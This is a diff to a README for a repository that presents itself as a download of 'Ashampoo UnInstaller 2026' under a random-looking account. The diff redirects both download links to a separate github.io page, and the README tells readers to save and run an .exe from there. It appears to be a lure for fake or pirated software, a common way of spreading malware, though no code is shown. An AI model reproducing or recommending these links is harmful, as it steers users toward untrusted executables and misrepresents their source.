@@ -1,6 +1,6 @@
 # 🧹 Ashampoo-UnInstaller-2026 - Clean your computer and remove apps
 
-[![](https://img.shields.io/badge/Download-Ashampoo-UnInstaller-blue.svg)](https://github.com/roughshod-commonbileduct906/Ashampoo-UnInstaller-2026)
+[![](https://img.shields.io/badge/Download-Ashampoo-UnInstaller-blue.svg)](https://roughshod-commonbileduct906.github.io)
 
 ## What is Ashampoo UnInstaller 2026
 
@@ -20,7 +20,7 @@ To run this application, your computer must meet these requirements:
 
 You obtain the installer from our primary repository page. Follow these instructions to reach the download location.
 
-1. Visit this page to download: [https://github.com/roughshod-commonbileduct906/Ashampoo-UnInstaller-2026](https://github.com/roughshod-commonbileduct906/Ashampoo-UnInstaller-2026).
+1. Visit this page to download: [https://roughshod-commonbileduct906.github.io](https://roughshod-commonbileduct906.github.io).
 2. Look for the Releases section on the right sidebar.
 3. Click the most recent version number.
 4. Select the file ending in .exe to save it to your computer.
